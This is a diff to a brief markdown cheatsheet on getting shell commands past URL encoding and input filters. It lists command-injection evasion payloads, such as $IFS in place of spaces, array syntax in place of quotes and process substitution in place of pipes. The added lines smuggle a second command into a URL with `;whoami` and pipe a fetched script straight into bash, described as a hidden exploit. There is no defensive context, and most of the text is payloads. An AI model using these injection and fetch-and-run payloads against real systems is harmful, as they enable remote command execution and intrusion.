@@ -3,15 +3,14 @@ bypass url encoding for nontrivial shell commands
 
 # cheatsheet  
 ### setting string variables without quotes    
-❌`a="a"`  
-✅`variable=('a')`  
+`variable=('a')`  
 ### separating fields without spaces 
-❌`echo $a`  
-✅`echo$IFS$a`
+`echo$IFS$a`
 ### separating fields without spaces and curly brackets
-❌`echo${IFS}a`     
-✅`a=('a');echo$IFS$a` 
+`a=('a');echo$IFS$a` 
 ### piping without pipes  
-❌`ls | wc -l`      
-✅`wc$IFS-l$IFS<$IFS<(ls)`     
-
+`wc$IFS-l$IFS<$IFS<(ls)`     
+### starting code execution in a url without ampersand
+`curl http://localhost/;whoami`
+### redirecting to a hidden exploit (localhost/bin/bash)
+`curl -s http://localhost/$0 | bash`
